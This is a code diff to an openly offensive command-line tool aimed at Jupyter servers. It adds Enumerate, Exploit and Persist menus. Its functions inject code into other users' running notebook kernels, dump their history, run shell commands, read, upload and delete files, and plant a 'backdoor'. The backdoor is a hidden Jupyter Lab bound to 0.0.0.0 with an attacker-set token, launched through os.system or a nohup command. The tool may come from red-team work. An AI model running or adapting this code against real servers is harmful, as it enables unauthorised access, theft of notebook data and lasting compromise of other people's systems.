@@ -15,85 +15,198 @@ class Menu:
         self.connection = None
 
     def login(self):
-        while len(self.sessions) == 0:
-            login_questions = [
-                inquirer.Text(
-                    "server",
-                    message="What is the server hostname?",
-                    default="http://localhost:8888/",
-                ),
-                inquirer.Text(
-                    "secret", message="What is the secret token or password?"
-                ),
-            ]
-            answers = inquirer.prompt(login_questions)
-            self.server = answers["server"]
-            if self.server[-1] != "/":
-                self.server += "/"
-            self.secret = answers["secret"]
-            try:
-                self.connection = Connection(self.server, self.secret)
-                self.sessions = self.connection.list_running_jpy_sessions()
-            except:
-                print("There was a problem connecting to that server. Try again.")
+        login_questions = [
+            inquirer.Text(
+                "server",
+                message="What is the server hostname?",
+                default="http://localhost:8888/",
+            ),
+            inquirer.Text("secret", message="What is the secret token or password?"),
+        ]
+        answers = inquirer.prompt(login_questions)
+        self.server = answers["server"]
+        if self.server[-1] != "/":
+            self.server += "/"
+        self.secret = answers["secret"]
+        try:
+            self.connection = Connection(self.server, self.secret)
+            self.sessions = self.connection.list_running_jpy_sessions()
+        except:
+            print("There was a problem connecting to that server. Try again.")
+            self.login()
+
+    def menu(self):
+        nav_menu = [
+            inquirer.List(
+                "option",
+                message="What would you like to do?",
+                choices=[
+                    "Reset",
+                    "Enumerate",
+                    "Exploit",
+                    "Persist",
+                ],
+            )
+        ]
+        answer = inquirer.prompt(nav_menu)
+        match answer["option"]:
+            case "Reset":
+                self.__init__()
+                self.main()
+            case "Enumerate":
+                self.enumerate()
+                self.menu()
+            case "Exploit":
+                self.exploit()
+                self.menu()
+            case "Persist":
+                self.persist()
+                self.menu()
+
+    def enumerate(self):
+        enumerate_menu = [
+            inquirer.List(
+                "option",
+                "How would you like to enumerate?",
+                choices=[
+                    "Run shell command",
+                    "List dir or get file",
+                    "See running notebooks",
+                    "Back to main menu",
+                ],
+            )
+        ]
+        answer = inquirer.prompt(enumerate_menu)
+        match answer["option"]:
+            case "Run shell command":
+                self.run_in_shell()
+                self.enumerate()
+            case "List dir or get file":
+                self.list_dir()
+                self.enumerate()
+            case "See running notebooks":
+                self.list_notebooks()
+                self.enumerate()
+            case "Back to main menu":
+                self.menu()
+
+    def exploit(self):
+        exploit_menu = [
+            inquirer.List(
+                "option",
+                "How would you like to exploit?",
+                choices=[
+                    "Run shell command",
+                    "Upload file",
+                    "Delete file",
+                    "Attack running notebook",
+                    "Back to main menu",
+                ],
+            )
+        ]
+        answer = inquirer.prompt(exploit_menu)
+        match answer["option"]:
+            case "Run shell command":
+                self.run_in_shell()
+                self.exploit()
+            case "Upload file":
+                self.upload()
+                self.exploit()
+            case "Delete file":
+                self.delete()
+                self.exploit()
+            case "Attack running notebook":
+                session_count = self.pick_target()
+                if session_count:
+                    self.exploit_attack()
+                else:
+                    self.connection.con.print("Returning to exploit menu")
+                    self.exploit()
+            case "Back to main menu":
+                self.menu()
+
+    def exploit_attack(self):
+        attack_menu = [
+            inquirer.List(
+                "option",
+                "Show history or inject code?",
+                choices=[
+                    "Show history",
+                    "Inject code",
+                    "Switch notebook",
+                    "Back to main menu",
+                ],
+            )
+        ]
+        answer = inquirer.prompt(attack_menu)
+        match answer["option"]:
+            case "Show history":
+                self.dump_history()
+                self.exploit_attack()
+            case "Inject code":
+                self.inject()
+                self.exploit_attack()
+            case "Switch notebook":
+                self.switch_target_notebook()
+                self.exploit_attack()
+            case "Back to main menu":
+                self.menu()
+
+    def persist(self):
+        persist_menu = [
+            inquirer.List(
+                "option",
+                "How would you like to establish persistence?",
+                choices=[
+                    "Run shell command",
+                    "Backdoor",
+                    "List dir or get file",
+                    "Upload file",
+                    "Delete file",
+                    "Back to main menu",
+                ],
+            )
+        ]
+        answer = inquirer.prompt(persist_menu)
+        match answer["option"]:
+            case "Run shell command":
+                self.run_in_shell()
+                self.persist()
+            case "Backdoor":
+                self.jupyter_backdoor()
+                self.persist()
+            case "List dir or get file":
+                self.list_dir()
+                self.persist()
+            case "Upload file":
+                self.upload()
+                self.persist()
+            case "Delete file":
+                self.delete()
+                self.persist()
+            case "Back to main menu":
+                self.menu()
 
     def pick_target(self):
         session_info = dict()
-        for s in self.sessions:
-            name = self.connection.jpy_sessions[s]["name"]
-            last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
-            session_info[f"{name:<20} {last_active:<30}"] = s
-        select_kernel = [
-            inquirer.List(
-                "kernel",
-                message="Which notebook would you like to attach to?",
-                choices=session_info.keys(),
-            )
-        ]
-        answer = inquirer.prompt(select_kernel)
-        self.target = session_info[answer["kernel"]]
-
-    def execute_op(self):
-        answer = dict()
-        answer["option"] = None
-        while answer["option"] != "Reset":
-            nav_menu = [
+        self.sessions = self.connection.list_running_jpy_sessions()
+        if len(self.sessions) == 0:
+            self.connection.con.print("No running notebooks to attach to")
+        else:
+            for s in self.sessions:
+                name = self.connection.jpy_sessions[s]["name"]
+                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
+                session_info[f"{name:<20} {last_active:<30}"] = s
+            select_kernel = [
                 inquirer.List(
-                    "option",
-                    message="What would you like to do?",
-                    choices=[
-                        "Reset",
-                        "Switch Notebooks",
-                        "Inject",
-                        "Backdoor",
-                        "Check History",
-                        "Run shell command",
-                        "List dir or get file",
-                        "Upload file",
-                        "Delete file",
-                    ],
+                    "kernel",
+                    message="Which notebook would you like to attach to?",
+                    choices=session_info.keys(),
                 )
             ]
-            answer = inquirer.prompt(nav_menu)
-            match answer["option"]:
-                case "Inject":
-                    self.inject()
-                case "Backdoor":
-                    self.jupyter_backdoor()
-                case "Check History":
-                    self.dump_history()
-                case "Switch Notebooks":
-                    self.switch_target_notebook()
-                case "Run shell command":
-                    self.run_in_shell()
-                case "List dir or get file":
-                    self.list_dir()
-                case "Upload file":
-                    self.upload()
-                case "Delete file":
-                    self.delete()
-        self.__init__()
-        self.main()
+            answer = inquirer.prompt(select_kernel)
+            self.target = session_info[answer["kernel"]]
+        return len(self.sessions)
 
     def inject(self):
         attack_menu = [
@@ -133,24 +246,48 @@ class Menu:
             attack_session(self.connection, self.target, payload_str, silent=silent)
         )
 
-    def jupyter_backdoor(self):
-        config = [
-            inquirer.Text(
-                "port", message="What port do you want your Jupyter Server to run on?"
-            ),
-            inquirer.Text(
-                "secret", message="What password do you want to use for authentication?"
-            ),
-        ]
-        config = inquirer.prompt(config)
+    def jupyter_backdoor(self, port=7777, secret=""):
         loop = asyncio.get_event_loop()
-        port = config["port"]
-        secret = config["secret"]
-        launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
-        loop.run_until_complete(
-            run_ephemeral_terminal(self.connection, launch_jupyter, stdout=False)
-        )
-        print(f"Backdoor established on {port}")
+        if len(secret) == 0:
+            config = [
+                inquirer.Text(
+                    "port",
+                    message="What port do you want your Jupyter Server to run on?",
+                ),
+                inquirer.Text(
+                    "secret",
+                    message="What password do you want to use for authentication?",
+                ),
+            ]
+            config = inquirer.prompt(config)
+            port = config["port"]
+            secret = config["secret"]
+        if self.target:
+            loop.run_until_complete(
+                attack_session(
+                    self.connection,
+                    self.target,
+                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
+                    silent=True,
+                    print_out=False,
+                )
+            )
+            self.connection.con.print(f"Backdoor established on {port}")
+        else:
+            print("Target needed for backdoor")
+            if self.pick_target():
+                self.jupyter_backdoor(port=port, secret=secret)
+            else:
+                self.connection.con.print("Attempting to spawn Jupyter from shell")
+                self.connection.con.print("May fail due to missing dependencies")
+                self.connection.con.print("Verify success manually")
+                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
+                loop.run_until_complete(
+                    run_ephemeral_terminal(
+                        self.connection, launch_jupyter, stdout=False
+                    )
+                )
+                self.connection.con.print(f"Backdoor established on {port}")
 
     def dump_history(self):
         loop = asyncio.get_event_loop()
@@ -166,22 +303,33 @@ class Menu:
         )
 
     def switch_target_notebook(self):
+        self.connection.list_running_jpy_sessions()
         self.pick_target()
-        self.execute_op()
+        self.exploit_attack()
 
     def run_in_shell(self):
-        code = [inquirer.Text("code", "What code would you like to inject?")]
+        code = [inquirer.Text("code", "What shell command would you like to run?")]
         answers = inquirer.prompt(code)
         loop = asyncio.get_event_loop()
         loop.run_until_complete(
             run_ephemeral_terminal(self.connection, answers["code"])
         )
 
+    def list_notebooks(self):
+        self.sessions = self.connection.list_running_jpy_sessions()
+        if len(self.sessions) > 0:
+            for s in self.connection.jpy_sessions:
+                name = self.connection.jpy_sessions[s]["name"]
+                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
+                self.connection.con.print(f"{name:<20} {last_active:<30}" + "\n")
+        else:
+            self.connection.con.print("No running notebooks")
+
     def list_dir(self):
         dir = [
             inquirer.Text(
                 "dir",
-                "What directory would you like to list (relative to the Jupyter directory)? You can also use this to read plaintext files.",
+                "What directory would you like to list (relative to the Jupyter directory)?\nYou can also use this to read plaintext files.",
                 default="/",
             )
         ]
@@ -227,36 +375,7 @@ class Menu:
 
     def main(self):
         self.login()
-        answer = [
-            inquirer.List(
-                "option",
-                message="Connect to user session or run shell command?",
-                choices=[
-                    "User session",
-                    "Run shell command",
-                    "List dir or plaintext file",
-                    "Upload file",
-                    "Delete file",
-                ],
-            )
-        ]
-        answer = inquirer.prompt(answer)
-        match answer["option"]:
-            case "User session":
-                self.pick_target()
-                self.execute_op()
-            case "Run shell command":
-                self.run_in_shell()
-                self.main()
-            case "List dir or get file":
-                self.list_dir()
-                self.main()
-            case "Upload file":
-                self.upload()
-                self.main()
-            case "Delete file":
-                self.delete()
-                self.main()
+        self.menu()
 
 
 def cli():
